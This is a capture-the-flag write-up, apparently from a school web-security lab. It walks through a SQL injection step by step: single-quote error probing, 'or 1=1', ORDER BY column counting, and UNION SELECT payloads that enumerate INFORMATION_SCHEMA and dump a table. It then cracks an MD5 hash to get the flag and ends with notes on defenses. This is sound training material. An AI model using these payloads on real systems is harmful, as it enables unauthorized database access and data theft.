# SQL Injection Definition

A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

# STEPS

## First Step:

Let's check input data is vulnerable of sql injection by sending single quote.  
Output:  
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1`

## Second Step:

Now when we find that input data is vulnerable let's try to guest what they querying on this specific input.  
Let's try to send a 1 as id and see the output  
Output:

```
ID: 1
Title: Nsa
Url : https://www.nsa.org/img.jpg
```

Now let's try to select all rows by sending `1 or 1=1`  
Output:

```
ID: 1 or 1=1
Title: Nsa
Url : https://www.nsa.org/img.jpg
ID: 1 or 1=1
Title: 42 !
Url : https://www.42.fr/42.png
ID: 1 or 1=1
Title: Google
Url : https://www.google.fr/google.png
ID: 1 or 1=1
Title: Obama
Url : https://www.obama.org/obama.jpg
ID: 1 or 1=1
Title: Hack me ?
Url : borntosec.ddns.net/images.png
ID: 1 or 1=1
Title: tr00l
Url : https://www.h4x0r3.0rg/tr0ll.png
```

Let's now use `UNION`, What's UNION Operator ?  
The UNION operator is used to combine the result-set of two or more SELECT statements.  
But to work UNION properly we must follow those conditions:

- Every SELECT statement within UNION must have the same number of columns
- The columns must also have similar data types
<!-- - The columns in every SELECT statement must also be in the same order -->

### Condition 1:

Let's find out how many columns they selected by using `order by`  
Usage of order by:

```
order by (column_name or index_of_selected_column)
```

We don't know column_name so we'll use `index_of_selected_column`  
order by 1 and order by 2 work perfectly as expected, but after using order by 3 it's return error. so we now know that we have two columns.

### Condition 2:

From the result we can see that both two columns is string

Now let's select current database

```
1 UNION SELECT NULL,DATABASE() // Member_images
```

And now let's try to find name of tables that databases have by sending this query

```
1 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x4d656d6265725f696d61676573
```

```
INFORMATION_SCHEMA: provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column
TABLE_SCHEMA: The name of the schema (database) to which the table belongs
TABLE_NAME: The name of the table
// 0x4d656d6265725f696d61676573 = Member_images
```

We find that database have just one tables (list_images)  
Now let's search for all columns names of this table

```
1 UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x4d656d6265725f696d61676573 AND TABLE_NAME=0x6c6973745f696d61676573
```

### [Columns]

```
id
url
title
comment
```

After searching all the columns we find that `title` contain password

```
1 UNION SELECT title,comment FROM Member_images.list_images
```

Output:

```
ID: 1 UNION SELECT title,comment FROM Member_images.list_images
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
```

After decrypt password and lower it thant hash it we'll get the flag

```
1928e8083cf461a51303633093573c46 = albatroz
albatroz = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## Flag : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Defenses

### Defense 1: Prepared Statements (with Parameterized Queries)

The use of prepared statements with variable binding (aka parameterized queries) is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied.

### Defense 2: Escaping All User-Supplied Input

This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations.

# Resources

### [SQL Injection OWASP](https://owasp.org/www-community/attacks/SQL_Injection)

### [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### [SQL Injection Exercise 1](https://www.hacksplaining.com/exercises/sql-injection)

### [SQL Injection Exercise 2](https://application.security/free-application-security-training/owasp-top-10-sql-injection)
